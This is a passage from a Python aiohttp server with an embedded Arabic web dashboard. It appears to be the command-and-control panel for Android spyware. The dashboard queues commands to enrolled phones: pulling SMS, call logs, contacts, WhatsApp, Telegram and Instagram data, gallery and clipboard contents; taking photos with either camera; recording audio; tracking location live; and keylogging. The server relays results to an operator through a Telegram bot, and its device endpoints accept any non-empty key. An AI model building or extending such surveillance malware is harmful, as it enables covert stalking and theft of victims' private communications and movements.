<div class="nav-item" data-page="sessions" onclick="showPage('sessions')"><span class="icon">&#x1F511;</span> الجلسات</div>
<div class="nav-item" data-page="settings" onclick="showPage('settings')"><span class="icon">&#x2699;</span> الإعدادات</div>
<div style="padding:20px;border-top:1px solid var(--border);margin-top:auto">
<button class="btn btn-danger" style="width:100%" onclick="doLogout()">&#x1F6AA; تسجيل الخروج</button>
</div>
</div>

<!-- Main Content -->
<div class="main" id="mainContent">
<div class="topbar">
<button class="hamburger" onclick="toggleSidebar()">&#x2630;</button>
<h1 id="pageTitle">الرئيسية</h1>
<div class="topbar-actions">
<span style="font-size:.8rem;color:var(--text2)" id="clockDisplay"></span>
</div>
</div>

<div class="content">
<!-- Home Page -->
<div class="page" id="page-home">
<div class="stats-grid">
<div class="stat-card"><div class="label">&#x23F1; وقت التشغيل</div><div class="value" id="sUptime">--</div><div class="sub">بالثواني</div></div>
<div class="stat-card"><div class="label">&#x1F4F1; الأجهزة</div><div class="value" id="sDevices">0</div><div class="sub">مسجل</div></div>
<div class="stat-card"><div class="label">&#x27;05;&#x200D;&#x274C; متصل</div><div class="value" id="sOnline">0</div><div class="sub">جهاز نشط</div></div>
<div class="stat-card"><div class="label">&#x1F4AC; الرسائل</div><div class="value" id="sMessages">0</div><div class="sub">مرسلة</div></div>
<div class="stat-card"><div class="label">&#x1F4CB; الأوامر</div><div class="value" id="sCommands">0</div><div class="sub">معلقة</div></div>
<div class="stat-card"><div class="label">&#x1F4CA; طلبات API</div><div class="value" id="sApiHits">0</div><div class="sub">طلب</div></div>
</div>
<div class="section-title">&#x1F4F1; آخر الأجهزة</div>
<table class="data-table"><thead><tr><th>الاسم</th><th>المعرف</th><th>الحالة</th><th>آخر نشاط</th></tr></thead><tbody id="homeDevices"></tbody></table>
<div class="section-title">&#x1F4DD; آخر الأحداث</div>
<div class="log-container" id="homeLog"></div>
</div>

<!-- Devices Page -->
<div class="page" id="page-devices" style="display:none">
<div class="export-row">
<button class="btn btn-outline btn-sm" onclick="exportData('json')">&#x1F4C4; JSON</button>
<button class="btn btn-outline btn-sm" onclick="exportData('csv')">&#x1F4CA; CSV</button>
</div>
<table class="data-table"><thead><tr><th>الاسم</th><th>المعرف</th><th>الموديل</th><th>البطارية</th><th>الحالة</th><th>آخر نشاط</th><th>إجراءات</th></tr></thead><tbody id="devicesTable"></tbody></table>
<div class="empty-state" id="noDevices" style="display:none">لا توجد أجهزة مسجلة</div>
</div>

<!-- Map Page -->
<div class="page" id="page-map" style="display:none">
<div class="map-container" id="mapContainer">
<span>&#x1F5FA; جارٍ تحميل الخريطة...</span>
</div>
</div>

<!-- Data Page -->
<div class="page" id="page-data" style="display:none">
<div class="tabs">
<div class="tab active" data-tab="sms" onclick="showDataTab('sms')">&#x1F4E8; رسائل SMS</div>
<div class="tab" data-tab="calls" onclick="showDataTab('calls')">&#x1F4DE; المكالمات</div>
<div class="tab" data-tab="contacts" onclick="showDataTab('contacts')">&#x1F4C7; جهات الاتصال</div>
<div class="tab" data-tab="notifications" onclick="showDataTab('notifications')">&#x1F514; الإشعارات</div>
<div class="tab" data-tab="apps" onclick="showDataTab('apps')">&#x1F4F1; التطبيقات</div>
</div>
<div class="cmd-form">
<div class="form-row"><label>الجهاز:</label><select id="dataDeviceSelect"><option value="">-- اختر جهاز --</option></select></div>
</div>
<div id="dataContent" class="log-container" style="min-height:200px"><span class="log-info">اختر جهازاً ونوع البيانات</span></div>
</div>

<!-- Command Center Page -->
<div class="page" id="page-commands" style="display:none">
<div class="cmd-form">
<h3>&#x1F3AE; إرسال أمر للجهاز</h3>
<div class="form-row"><label>الجهاز:</label><select id="cmdDeviceSelect"><option value="">-- اختر جهاز --</option></select></div>
<div class="form-row"><label>الأمر:</label><select id="cmdSelect">
<option value="ping">&#x1F4E1; فحص اتصال</option>
<option value="get_sms">&#x1F4E8; رسائل SMS</option>
<option value="get_calls">&#x1F4DE; المكالمات</option>
<option value="get_contacts">&#x1F4C7; جهات الاتصال</option>
<option value="get_location">&#x1F4CD; الموقع</option>
<option value="get_notifications">&#x1F514; الإشعارات</option>
<option value="get_apps">&#x1F4F1; التطبيقات</option>
<option value="get_info">&#x2139; معلومات الجهاز</option>
<option value="get_battery">&#x1F50B; البطارية</option>
<option value="get_gallery">&#x1F5BC; المعرض</option>
<option value="get_clipboard">&#x1F4CB; الحافظة</option>
<option value="get_all">&#x1F4E5; جميع البيانات</option>
<option value="vibrate">&#x1F4F3; اهتزاز</option>
<option value="ring">&#x1F514; رنين</option>
<option value="screenshot">&#x1F4F7; لقطة شاشة</option>
<option value="front_camera">&#x1F4F7; كاميرا أمامية</option>
<option value="back_camera">&#x1F4F8; كاميرا خلفية</option>
<option value="record_audio">&#x1F3A4; تسجيل صوت</option>
<option value="flash_on">&#x1F526; تشغيل الفلاش</option>
<option value="flash_off">&#x1F526; إطفاء الفلاش</option>
<option value="get_whatsapp">&#x1F4AC; واتساب</option>
<option value="get_telegram">&#x2708; تليجرام</option>
<option value="get_instagram">&#x1F4F8; انستجرام</option>
<option value="location_live">&#x1F4CD; تتبع مباشر</option>
<option value="location_stop">&#x23F9; إيقاف التتبع</option>
<option value="location_history">&#x1F4DC; سجل المواقع</option>
<option value="app_usage">&#x1F4CA; استخدام التطبيقات</option>
<option value="screen_time">&#x23F1; وقت الشاشة</option>
<option value="keylogger_get">&#x2328; بيانات المفاتيح</option>
</select></div>
<button class="btn btn-primary" onclick="sendCommand()">&#x1F680; إرسال الأمر</button>
</div>
<div class="section-title">&#x1F4CB; الأوامر السابقة</div>
<div class="log-container" id="cmdHistory"></div>
</div>

<!-- Logs Page -->
<div class="page" id="page-logs" style="display:none">
<div class="export-row">
<button class="btn btn-outline btn-sm" onclick="clearLogs()">&#x1F5D1; مسح السجل</button>
</div>
<div class="log-container" id="logContainer" style="max-height:600px"></div>
</div>

<!-- Sessions Page -->
<div class="page" id="page-sessions" style="display:none">
<table class="data-table"><thead><tr><th>المستخدم</th><th>رمز الجلسة</th><th>تاريخ الإنشاء</th><th>تاريخ الانتهاء</th><th>إجراءات</th></tr></thead><tbody id="sessionsTable"></tbody></table>
</div>

<!-- Settings Page -->
<div class="page" id="page-settings" style="display:none">
<div class="setting-group">
<h3>&#x2699; الإعدادات العامة</h3>
<div class="setting-row"><span>فترة المزامنة (ثانية)</span><input type="number" id="setSyncInterval" style="width:80px;text-align:center" onchange="updateSetting('sync_interval',this.value)"></div>
<div class="setting-row"><span>فترة الموقع (ثانية)</span><input type="number" id="setLocInterval" style="width:80px;text-align:center" onchange="updateSetting('location_interval',this.value)"></div>
<div class="setting-row"><span>الموقع التلقائي</span><div class="toggle" id="toggleAutoLoc" onclick="toggleSetting('auto_location')"></div></div>
<div class="setting-row"><span>المزامنة التلقائية</span><div class="toggle" id="toggleAutoSync" onclick="toggleSetting('auto_sync')"></div></div>
<div class="setting-row"><span>الإشعارات</span><div class="toggle" id="toggleNotify" onclick="toggleSetting('notifications')"></div></div>
<div class="setting-row"><span>تسجيل المفاتيح</span><div class="toggle" id="toggleKeylog" onclick="toggleSetting('keylogger')"></div></div>
<div class="setting-row"><span>كشف تغيير الشريحة</span><div class="toggle" id="toggleSim" onclick="toggleSetting('sim_detect')"></div></div>
<div class="setting-row"><span>مراقبة الواي فاي</span><div class="toggle" id="toggleWifi" onclick="toggleSetting('wifi_monitor')"></div></div>
</div>
<div class="setting-group">
<h3>&#x1F4BE; إدارة البيانات</h3>
<div class="form-row" style="margin-top:12px">
<button class="btn btn-primary" onclick="createBackup()">&#x1F4BE; نسخ احتياطي</button>
<button class="btn btn-outline" onclick="exportData('json')">&#x1F4C4; تصدير JSON</button>
<button class="btn btn-outline" onclick="exportData('csv')">&#x1F4CA; تصدير CSV</button>
</div>
</div>
</div>

</div><!-- content -->
</div><!-- main -->
</div><!-- dashboardPage -->

<script>
const API=window.location.origin;
let sessionToken=null;
let refreshTimer=null;
let currentPage='home';
let localApiHits=0;

// ── Auth ──
function getCookie(name){const v=document.cookie.match('(^|;) ?'+name+'=([^;]*)(;|$)');return v?v[2]:null}
function setCookie(name,val,days){const d=new Date;d.setTime(d.getTime()+days*86400000);document.cookie=name+'='+val+';path=/;expires='+d.toUTCString()}
function delCookie(name){document.cookie=name+'=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC'}

async function checkSession(){
  const token=getCookie('az_session');
  if(!token){showLogin();return false}
  try{
    const r=await fetch(API+'/api/sessions?token='+encodeURIComponent(token));
    if(!r.ok){showLogin();return false}
    const sessions=await r.json();
    if(!sessions.find(s=>s.token===token)){showLogin();return false}
    sessionToken=token;
    showDashboard();
    return true;
  }catch(e){showLogin();return false}
}

async function doLogin(){
  const user=document.getElementById('loginUser').value;
  const pass=document.getElementById('loginPass').value;
  try{
    const r=await fetch(API+'/api/sessions',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:user,password:pass})});
    const data=await r.json();
    if(data.ok&&data.token){
      sessionToken=data.token;
      setCookie('az_session',data.token,1);
      showDashboard();
    }else{
      document.getElementById('loginError').style.display='block';
    }
  }catch(e){
    document.getElementById('loginError').style.display='block';
  }
}

function doLogout(){
  if(sessionToken)fetch(API+'/api/sessions/'+sessionToken,{method:'DELETE'}).catch(()=>{});
  sessionToken=null;
  delCookie('az_session');
  showLogin();
}

function showLogin(){document.getElementById('loginPage').style.display='flex';document.getElementById('dashboardPage').style.display='none';if(refreshTimer)clearInterval(refreshTimer)}
function showDashboard(){document.getElementById('loginPage').style.display='none';document.getElementById('dashboardPage').style.display='block';refresh();refreshTimer=setInterval(refresh,5000)}

// ── Navigation ──
function showPage(page){
  currentPage=page;
  document.querySelectorAll('.page').forEach(p=>p.style.display='none');
  const el=document.getElementById('page-'+page);
  if(el)el.style.display='block';
  document.querySelectorAll('.nav-item').forEach(n=>n.classList.toggle('active',n.dataset.page===page));
  const titles={home:'الرئيسية',devices:'الأجهزة',map:'الخريطة',data:'البيانات',commands:'مركز الأوامر',logs:'سجل الأحداث',sessions:'الجلسات',settings:'الإعدادات'};
  document.getElementById('pageTitle').textContent=titles[page]||'';
  if(page==='map')loadMap();
}
function toggleSidebar(){document.getElementById('sidebar').classList.toggle('open')}

// ── Clock ──
function updateClock(){document.getElementById('clockDisplay').textContent=new Date().toLocaleString('ar-SA')}
setInterval(updateClock,1000);updateClock();

// ── API Calls ──
async function apiGet(path){
  localApiHits++;
  try{
    const r=await fetch(API+path);
    if(r.status===401){showLogin();return null}
    return await r.json();
  }catch(e){console.error(e);return null}
}
async function apiPost(path,body){
  localApiHits++;
  try{
    const r=await fetch(API+path,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
    return await r.json();
  }catch(e){return null}
}
async function apiDelete(path){
  try{const r=await fetch(API+path,{method:'DELETE'});return await r.json()}catch(e){return null}
}

// ── Refresh ──
async function refresh(){
  try{
    const [s,d,l,cmds,sess]=await Promise.all([
      apiGet('/api/status'),
      apiGet('/api/devices'),
      apiGet('/api/logs?limit=50'),
      apiGet('/api/commands?limit=30'),
      apiGet('/api/sessions'),
    ]);
    if(!s)return;

    // Stats
    document.getElementById('sUptime').textContent=s.uptime||0;
    const devs=d||[];
    const online=devs.filter(x=>x.active).length;
    document.getElementById('sDevices').textContent=devs.length;
    document.getElementById('sOnline').textContent=online;
    document.getElementById('sMessages').textContent=s.messages_sent||0;
    const pendingCmds=(cmds||[]).filter(c=>c.status==='pending').length;
    document.getElementById('sCommands').textContent=pendingCmds;
    document.getElementById('sApiHits').textContent=localApiHits;

    // Populate device selects
    populateSelect('dataDeviceSelect',devs);
    populateSelect('cmdDeviceSelect',devs);

    // Home devices
    const hd=document.getElementById('homeDevices');
    hd.innerHTML=devs.slice(0,5).map(x=>`<tr><td>${x.name||'—'}</td><td><code>${x.id}</code></td><td><span class="badge ${x.active?'badge-success':'badge-danger'}">${x.active?'متصل':'غير متصل'}</span></td><td>${x.last_seen||'—'}</td></tr>`).join('');

    // Home log
    const logs=l||[];
    const hl=document.getElementById('homeLog');
    hl.innerHTML=logs.slice(-10).reverse().map(e=>{
      const cls=e.level==='error'?'log-err':e.level==='warn'?'log-warn':'log-info';
      return `<div class="log-entry ${cls}">[${e.time.slice(11,19)}] ${e.event}</div>`;
    }).join('')||'<span class="log-info">لا توجد أحداث</span>';

    // Devices page
    const dt=document.getElementById('devicesTable');
    const nd=document.getElementById('noDevices');
    if(!devs.length){dt.innerHTML='';nd.style.display='block'}
    else{nd.style.display='none';dt.innerHTML=devs.map(x=>`<tr>
      <td>${x.name||'—'}</td><td><code>${x.id}</code></td><td>${x.model||'—'}</td>
      <td>${x.battery||'—'}%</td>
      <td><span class="badge ${x.active?'badge-success':'badge-danger'}">${x.active?'متصل':'غير متصل'}</span></td>
      <td>${x.last_seen||'—'}</td>
      <td><button class="btn btn-sm btn-primary" onclick="showDeviceModal('${x.id}')">&#x1F50D;</button>
      <button class="btn btn-sm btn-danger" onclick="removeDevice('${x.id}')">&#x1F5D1;</button></td>
    </tr>`).join('')}

    // Logs page
    const lc=document.getElementById('logContainer');
    lc.innerHTML=logs.reverse().map(e=>{
      const cls=e.level==='error'?'log-err':e.level==='warn'?'log-warn':e.level==='ok'?'log-ok':'log-info';
      return `<div class="log-entry ${cls}">[${e.time}] ${e.event} ${e.details?JSON.stringify(e.details):''}</div>`;
    }).join('')||'<span class="log-info">لا توجد أحداث</span>';

    // Commands page
    const ch=document.getElementById('cmdHistory');
    ch.innerHTML=(cmds||[]).reverse().map(c=>{
      const cls=c.status==='pending'?'log-warn':c.status==='completed'?'log-ok':'log-err';
      return `<div class="log-entry ${cls}">[${c.created_at}] ${c.command} → ${c.device_id} (${c.status})</div>`;
    }).join('')||'<span class="log-info">لا توجد أوامر</span>';

    // Sessions page
    const st=document.getElementById('sessionsTable');
    st.innerHTML=(sess||[]).map(s=>`<tr>
      <td>${s.username||'—'}</td><td><code>${s.token.slice(0,16)}...</code></td>
      <td>${s.created_at||'—'}</td><td>${s.expires_at||'—'}</td>
      <td><button class="btn btn-sm btn-danger" onclick="deleteSession('${s.token}')">&#x1F5D1;</button></td>
    </tr>`).join('');

    // Settings
    loadSettings(s.settings||{});
  }catch(e){console.error('Refresh error:',e)}
}

function populateSelect(id,devs){
  const sel=document.getElementById(id);
  if(!sel)return;
  const val=sel.value;
  sel.innerHTML='<option value="">-- اختر جهاز --</option>'+devs.map(d=>`<option value="${d.id}">${d.name||d.id}</option>`).join('');
  if(val)sel.value=val;
}

// ── Device actions ──
async function removeDevice(id){if(!confirm('هل أنت متأكد من حذف هذا الجهاز؟'))return;await apiDelete('/api/devices/'+id);refresh()}

async function showDeviceModal(id){
  const devs=await apiGet('/api/devices');
  const d=(devs||[]).find(x=>x.id===id);
  if(!d)return;
  let html=`<h3>&#x1F4F1; ${d.name||d.id}</h3>
  <table class="data-table"><tbody>
  <tr><td><b>المعرف</b></td><td><code>${d.id}</code></td></tr>
  <tr><td><b>الموديل</b></td><td>${d.model||'—'}</td></tr>
  <tr><td><b>النظام</b></td><td>${d.os||'—'}</td></tr>
  <tr><td><b>البطارية</b></td><td>${d.battery||'—'}%</td></tr>
  <tr><td><b>الشبكة</b></td><td>${d.network||'—'}</td></tr>
  <tr><td><b>الحالة</b></td><td><span class="badge ${d.active?'badge-success':'badge-danger'}">${d.active?'متصل':'غير متصل'}</span></td></tr>
  <tr><td><b>آخر نشاط</b></td><td>${d.last_seen||'—'}</td></tr>
  </tbody></table>`;
  showModal(html);
}

// ── Map ──
async function loadMap(){
  const devs=await apiGet('/api/devices');
  const locs=(devs||[]).filter(d=>d.lat&&d.lng);
  const mc=document.getElementById('mapContainer');
  if(!locs.length){mc.innerHTML='<span>&#x1F4CD; لا توجد مواقع متاحة للأجهزة</span>';return}
  let markers='';
  locs.forEach(d=>{markers+=`<marker name="${d.name||d.id}" lat="${d.lat}" lng="${d.lng}"/>`});
  mc.innerHTML=`<iframe src="https://www.openstreetmap.org/export/embed.html?bbox=${Math.min(...locs.map(d=>parseFloat(d.lng)))-0.01},${Math.min(...locs.map(d=>parseFloat(d.lat)))-0.01},${Math.max(...locs.map(d=>parseFloat(d.lng)))+0.01},${Math.max(...locs.map(d=>parseFloat(d.lat)))+0.01}&layer=mapnik&marker=${locs[0].lat},${locs[0].lng}" loading="lazy"></iframe>`;
}

// ── Data viewer ──
async function showDataTab(type){
  document.querySelectorAll('.tab').forEach(t=>t.classList.toggle('active',t.dataset.tab===type));
  const devId=document.getElementById('dataDeviceSelect').value;
  if(!devId){document.getElementById('dataContent').innerHTML='<span class="log-info">اختر جهازاً أولاً</span>';return}
  const data=await apiGet('/api/devices/'+devId+'/data/'+type);
  const dc=document.getElementById('dataContent');
  if(!data||data.error){dc.innerHTML='<span class="log-err">لا توجد بيانات متاحة</span>';return}
  if(Array.isArray(data)){dc.innerHTML=data.map((item,i)=>`<div class="log-entry log-info">${JSON.stringify(item)}</div>`).join('')||'<span class="log-info">لا توجد بيانات</span>'}
  else{dc.innerHTML=`<pre style="white-space:pre-wrap">${JSON.stringify(data,null,2)}</pre>`}
}

// ── Command center ──
async function sendCommand(){
  const devId=document.getElementById('cmdDeviceSelect').value;
  const cmd=document.getElementById('cmdSelect').value;
  if(!devId){alert('اختر جهازاً أولاً');return}
  const result=await apiPost('/api/devices/'+devId+'/command',{command:cmd});
  if(result&&result.ok)alert('✅ تم إرسال الأمر');
  refresh();
}

// ── Settings ──
function loadSettings(s){
  document.getElementById('setSyncInterval').value=s.sync_interval||300;
  document.getElementById('setLocInterval').value=s.location_interval||60;
  setToggle('toggleAutoLoc',s.auto_location);
  setToggle('toggleAutoSync',s.auto_sync);
  setToggle('toggleNotify',s.notifications);
  setToggle('toggleKeylog',s.keylogger);
  setToggle('toggleSim',s.sim_detect);
  setToggle('toggleWifi',s.wifi_monitor);
}
function setToggle(id,val){const el=document.getElementById(id);if(el){el.classList.toggle('on',!!val)}}
async function updateSetting(key,val){
  await apiPost('/api/settings',{[key]:parseInt(val)||val});
}
async function toggleSetting(key){
  const s=await apiGet('/api/settings');
  if(!s)return;
  s[key]=!s[key];
  await apiPost('/api/settings',s);
  refresh();
}

// ── Export ──
async function exportData(fmt){
  const a=document.createElement('a');
  const devs=await apiGet('/api/devices');
  if(fmt==='csv'){
    if(!devs||!devs.length)return;
    let csv=Object.keys(devs[0]).join(',')+'\n';
    devs.forEach(d=>csv+=Object.values(d).map(v=>String(v||'').replace(/,/g,';')).join(',')+'\n');
    a.href='data:text/csv;charset=utf-8,'+encodeURIComponent('\uFEFF'+csv);
    a.download='devices_export.csv';
  }else{
    a.href='data:application/json;charset=utf-8,'+encodeURIComponent(JSON.stringify(devs||[],null,2));
    a.download='devices_export.json';
  }
  a.click();
}

async function createBackup(){
  const r=await apiPost('/api/backup',{});
  if(r&&r.ok)alert('✅ تم إنشاء النسخة الاحتياطية: '+r.file);
}

// ── Sessions ──
async function deleteSession(token){await apiDelete('/api/sessions/'+token);refresh()}
async function clearLogs(){if(!confirm('مسح جميع الأحداث؟'))return;await apiPost('/api/logs/clear',{});refresh()}

// ── Modal ──
function showModal(html){
  let m=document.getElementById('modal');
  if(!m){m=document.createElement('div');m.id='modal';m.className='modal-overlay';document.body.appendChild(m)}
  m.innerHTML=`<div class="modal"><button class="modal-close" onclick="closeModal()">&times;</button>${html}</div>`;
  m.classList.add('show');
}
function closeModal(){const m=document.getElementById('modal');if(m)m.classList.remove('show')}

// ── Init ──
document.getElementById('loginPass').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin()});
checkSession();
</script>
</body>
</html>"""


# ═══════════════════════════════════════════════════════════════════════════════
# REST API Handlers
# ═══════════════════════════════════════════════════════════════════════════════

async def handle_index(request: web.Request) -> web.Response:
    return web.Response(text=DASHBOARD_HTML, content_type="text/html", charset="utf-8")


async def handle_health(request: web.Request) -> web.Response:
    return web.json_response({"alive": True, "ts": ts(), "uptime": uptime()})


def require_auth(handler):
    """Decorator to require valid session for API endpoints."""
    async def wrapper(request: web.Request):
        token = request.query.get("token") or request.headers.get("X-Session-Token", "")
        if not token:
            token = request.cookies.get("az_session", "")
        session = validate_session(token)
        if not session:
            return web.json_response({"error": "غير مصرح"}, status=401)
        request["session"] = session
        return await handler(request)
    return wrapper


@require_auth
async def handle_api_status(request: web.Request) -> web.Response:
    devices = get_devices()
    online = sum(1 for d in devices if d.get("active"))
    commands = load_json(COMMANDS_FILE, [])
    pending = sum(1 for c in commands if c.get("status") == "pending")
    settings = load_settings()
    return web.json_response({
        "bot_username": "Abu_Zahra_Bot",
        "status": "running",
        "uptime": uptime(),
        "uptime_formatted": format_uptime(uptime()),
        "messages_sent": messages_sent,
        "server_time": ts(),
        "port": SERVER_PORT,
        "devices_total": len(devices),
        "devices_online": online,
        "commands_pending": pending,
        "settings": settings,
    })


@require_auth
async def handle_api_devices(request: web.Request) -> web.Response:
    devices = get_devices()
    return web.json_response(devices)


@require_auth
async def handle_api_add_device(request: web.Request) -> web.Response:
    body = await request.json()
    device_id = body.get("id", f"dev_{secrets.token_hex(4)}")
    link_code = body.get("link_code", "")
    settings = load_settings()

    # Validate link code if provided
    if link_code:
        stored_code = settings.get("link_code", "")
        expires = settings.get("link_code_expires", "")
        if link_code != stored_code:
            return web.json_response({"ok": False, "error": "كود الربط غير صحيح"}, status=400)
        if expires:
            try:
                exp_time = datetime.fromisoformat(expires).replace(tzinfo=timezone.utc)
                if datetime.now(timezone.utc) > exp_time:
                    return web.json_response({"ok": False, "error": "انتهت صلاحية الكود"}, status=400)
            except Exception:
                pass
        settings["link_code"] = ""
        settings["link_code_expires"] = ""
        save_settings(settings)
        append_event("ربط جهاز بالكود", {"device_id": device_id, "code": link_code})

    device = {
        "id": device_id,
        "name": body.get("name", ""),
        "model": body.get("model", ""),
        "os": body.get("os", ""),
        "battery": body.get("battery", 0),
        "network": body.get("network", ""),
        "lat": body.get("lat"),
        "lng": body.get("lng"),
        "active": True,
        "extra": body.get("extra", {}),
    }
    result = add_device(device)
    return web.json_response({"ok": True, "device": result}, status=201)


@require_auth
async def handle_api_delete_device(request: web.Request) -> web.Response:
    device_id = request.match_info["device_id"]
    if remove_device(device_id):
        return web.json_response({"ok": True})
    return web.json_response({"ok": False, "error": "الجهاز غير موجود"}, status=404)


@require_auth
async def handle_api_device_command(request: web.Request) -> web.Response:
    device_id = request.match_info["device_id"]
    body = await request.json()
    command = body.get("command", "")
    if not command:
        return web.json_response({"ok": False, "error": "الأمر مطلوب"}, status=400)
    d = find_device(device_id)
    if not d:
        return web.json_response({"ok": False, "error": "الجهاز غير موجود"}, status=404)
    params = body.get("params", {})
    cmd = queue_command(device_id, command, params)
    append_event("إرسال أمر عبر API", {"device_id": device_id, "command": command})
    return web.json_response({"ok": True, "command": cmd})


@require_auth
async def handle_api_device_data(request: web.Request) -> web.Response:
    device_id = request.match_info["device_id"]
    data_type = request.match_info["data_type"]
    d = find_device(device_id)
    if not d:
        return web.json_response({"error": "الجهاز غير موجود"}, status=404)

    # Return device's stored data for the requested type
    data = d.get("data", {}).get(data_type, [])
    if not data and data_type in d:
        data = d[data_type]
    return web.json_response(data if data else {"error": "لا توجد بيانات"})


@require_auth
async def handle_api_sessions(request: web.Request) -> web.Response:
    cleanup_expired_sessions()
    sessions = get_sessions()
    # Mask tokens for security
    safe_sessions = []
    for s in sessions:
        safe = {**s}
        safe_sessions.append(safe)
    return web.json_response(safe_sessions)


async def handle_api_create_session(request: web.Request) -> web.Response:
    body = await request.json()
    username = body.get("username", "")
    password = body.get("password", "")
    if not username or not password:
        return web.json_response({"ok": False, "error": "اسم المستخدم وكلمة المرور مطلوبان"}, status=400)
    session = create_session(username, password)
    if not session:
        return web.json_response({"ok": False, "error": "بيانات الدخول غير صحيحة"}, status=401)
    response = web.json_response({"ok": True, "token": session["token"]})
    response.set_cookie("az_session", session["token"], max_age=86400, httponly=True)
    return response


@require_auth
async def handle_api_delete_session(request: web.Request) -> web.Response:
    token = request.match_info["session_id"]
    delete_session(token)
    return web.json_response({"ok": True})


@require_auth
async def handle_api_logs(request: web.Request) -> web.Response:
    events = load_json(EVENTS_FILE, [])
    limit = int(request.query.get("limit", "50"))
    return web.json_response(events[-limit:])


@require_auth
async def handle_api_clear_logs(request: web.Request) -> web.Response:
    save_json(EVENTS_FILE, [])
    append_event("مسح سجل الأحداث", {"source": "dashboard"})
    return web.json_response({"ok": True})


@require_auth
async def handle_api_commands(request: web.Request) -> web.Response:
    commands = load_json(COMMANDS_FILE, [])
    limit = int(request.query.get("limit", "50"))
    return web.json_response(commands[-limit:])


@require_auth
async def handle_api_stats(request: web.Request) -> web.Response:
    devices = get_devices()
    online = sum(1 for d in devices if d.get("active"))
    events = load_json(EVENTS_FILE, [])
    commands = load_json(COMMANDS_FILE, [])
    return web.json_response({
        "uptime": uptime(),
        "devices_total": len(devices),
        "devices_online": online,
        "messages_sent": messages_sent,
        "events_count": len(events),
        "commands_pending": sum(1 for c in commands if c.get("status") == "pending"),
        "commands_completed": sum(1 for c in commands if c.get("status") == "completed"),
        "commands_failed": sum(1 for c in commands if c.get("status") == "failed"),
    })


@require_auth
async def handle_api_export(request: web.Request) -> web.Response:
    body = await request.json()
    device_id = body.get("device_id", "all")
    fmt = body.get("format", "json")
    devices = get_devices()
    if device_id and device_id != "all":
        devices = [d for d in devices if d["id"] == device_id]

    if fmt == "csv":
        if not devices:
            return web.json_response({"error": "لا توجد بيانات"}, status=404)
        output = StringIO()
        headers = list(devices[0].keys())
        output.write(",".join(headers) + "\n")
        for d in devices:
            output.write(",".join(str(d.get(h, "")) for h in headers) + "\n")
        content = output.getvalue()
        return web.Response(text=content, content_type="text/csv", charset="utf-8")
    else:
        return web.json_response(devices)


@require_auth
async def handle_api_backup(request: web.Request) -> web.Response:
    devices = get_devices()
    events = load_json(EVENTS_FILE, [])
    settings = load_settings()
    commands = load_json(COMMANDS_FILE, [])
    backup = {
        "timestamp": ts(),
        "devices": devices,
        "events": events[-200:],
        "settings": settings,
        "commands": commands[-100:],
    }
    filename = f"backup_{int(time.time())}.json"
    filepath = DATA_DIR / filename
    save_json(filepath, backup)
    append_event("إنشاء نسخة احتياطية", {"file": filename, "source": "dashboard"})
    return web.json_response({"ok": True, "file": filename})


@require_auth
async def handle_api_settings_get(request: web.Request) -> web.Response:
    settings = load_settings()
    return web.json_response(settings)


@require_auth
async def handle_api_settings_update(request: web.Request) -> web.Response:
    body = await request.json()
    settings = load_settings()
    for key, value in body.items():
        if key in settings:
            settings[key] = value
    save_settings(settings)
    append_event("تحديث الإعدادات", {"keys": list(body.keys())})
    return web.json_response({"ok": True, "settings": settings})


# Device data upload endpoint (for Android app to push data)
async def handle_api_device_upload(request: web.Request) -> web.Request:
    device_id = request.match_info["device_id"]
    body = await request.json()
    auth_key = request.headers.get("X-Device-Key", "")
    if not auth_key:
        return web.json_response({"error": "مفتاح الجهاز مطلوب"}, status=401)

    devices = get_devices()
    for i, d in enumerate(devices):
        if d.get("id") == device_id:
            d.update(body)
            d["last_seen"] = ts()
            d["active"] = True
            devices[i] = d
            save_devices(devices)
            append_event("تحديث بيانات الجهاز", {"id": device_id})
            return web.json_response({"ok": True})

    return web.json_response({"error": "الجهاز غير مسجل"}, status=404)


# Get pending commands for a device
async def handle_api_device_pending_commands(request: web.Request) -> web.Response:
    device_id = request.match_info["device_id"]
    auth_key = request.headers.get("X-Device-Key", "")
    if not auth_key:
        return web.json_response({"error": "مفتاح الجهاز مطلوب"}, status=401)
    pending = get_pending_commands(device_id)
    # Mark as sent
    commands = load_json(COMMANDS_FILE, [])
    now = ts()
    for c in commands:
        if c.get("device_id") == device_id and c.get("status") == "pending":
            c["status"] = "sent"
            c["sent_at"] = now
    save_json(COMMANDS_FILE, commands)
    return web.json_response(pending)


# Command result from device
async def handle_api_device_command_result(request: web.Request) -> web.Response:
    device_id = request.match_info["device_id"]
    cmd_id = request.match_info["cmd_id"]
    auth_key = request.headers.get("X-Device-Key", "")
    if not auth_key:
        return web.json_response({"error": "مفتاح الجهاز مطلوب"}, status=401)
    body = await request.json()
    commands = load_json(COMMANDS_FILE, [])
    for c in commands:
        if c.get("id") == cmd_id and c.get("device_id") == device_id:
            c["status"] = body.get("status", "completed")
            c["result"] = body.get("result", {})
            break
    save_json(COMMANDS_FILE, commands)
    append_event("نتيجة أمر", {"device_id": device_id, "cmd_id": cmd_id, "status": body.get("status")})

    # Forward result to admin via Telegram
    if body.get("status") == "completed" and body.get("result"):
        result_data = body["result"]
        if isinstance(result_data, dict) and result_data.get("notify", True):
            summary = json.dumps(result_data, ensure_ascii=False, indent=2)[:4000]
            await send_admin(
                f"📦 <b>نتيجة أمر</b>\n"
                f"📱 الجهاز: <code>{device_id}</code>\n"
                f"📋 الأمر: <code>{cmd_id}</code>\n\n"
                f"<pre>{summary}</pre>"
            )

    return web.json_response({"ok": True})


# ═══════════════════════════════════════════════════════════════════════════════
# App Factory
# ═══════════════════════════════════════════════════════════════════════════════

def create_app() -> web.Application:
    app = web.Application()
    app.router.add_get("/", handle_index)
    app.router.add_get("/health", handle_health)

    # Public device endpoints (for Android app)
    app.router.add_put("/api/devices/{device_id}/data", handle_api_device_upload)
    app.router.add_get("/api/devices/{device_id}/commands", handle_api_device_pending_commands)
    app.router.add_post("/api/devices/{device_id}/commands/{cmd_id}/result", handle_api_device_command_result)

    # Auth-protected API
    app.router.add_get("/api/status", handle_api_status)
    app.router.add_get("/api/devices", handle_api_devices)
    app.router.add_post("/api/devices", handle_api_add_device)
    app.router.add_delete("/api/devices/{device_id}", handle_api_delete_device)
    app.router.add_post("/api/devices/{device_id}/command", handle_api_device_command)
    app.router.add_get("/api/devices/{device_id}/data/{data_type}", handle_api_device_data)

    # Sessions
